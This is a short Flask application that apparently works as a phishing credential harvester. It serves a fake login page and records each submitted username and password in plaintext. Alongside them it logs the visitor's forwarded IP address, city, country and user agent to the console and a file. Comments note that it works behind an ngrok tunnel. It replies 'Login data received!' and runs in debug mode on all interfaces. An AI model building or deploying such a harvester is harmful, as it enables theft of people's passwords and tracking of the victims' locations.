from flask import Flask, render_template, request
from datetime import datetime
from config import load_config
import os

app = Flask(__name__)
config = load_config()

def get_real_ip():
    """Get the real IP address of the client, even through ngrok"""
    # Try to get IP from ngrok-specific headers
    if 'X-Forwarded-For' in request.headers:
        # X-Forwarded-For header contains a comma-separated list of IPs
        # The first one is the original client IP
        return request.headers['X-Forwarded-For'].split(',')[0].strip()
    elif 'X-Real-IP' in request.headers:
        return request.headers['X-Real-IP']
    
    # Fallback to remote_addr if no forwarded headers
    return request.remote_addr

def log_attempt(message):
    print(message)  # Always print to console
    
    if config['save_logs']:
        with open(config['log_file'], 'a') as f:
            f.write(message + '\n')

@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        ip_address = get_real_ip()
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        # Get additional information about the request
        user_agent = request.headers.get('User-Agent', 'Unknown')
        country = request.headers.get('X-Original-Country', 'Unknown')
        city = request.headers.get('X-Original-City', 'Unknown')
        
        log_message = (
            f"new login {username} {password} | "
            f"IP: {ip_address} | "
            f"Location: {city}, {country} | "
            f"User-Agent: {user_agent} | "
            f"Time: {timestamp}"
        )
        log_attempt(log_message)
        
        return "Login data received!"
    return render_template('login.html')

if __name__ == '__main__':
    print("Server started! Access logs will appear here...")
    if config['save_logs']:
        print(f"Login attempts will be saved to: {os.path.abspath(config['log_file'])}")
    
    app.run(host='0.0.0.0', port=config['server_port'], debug=True) 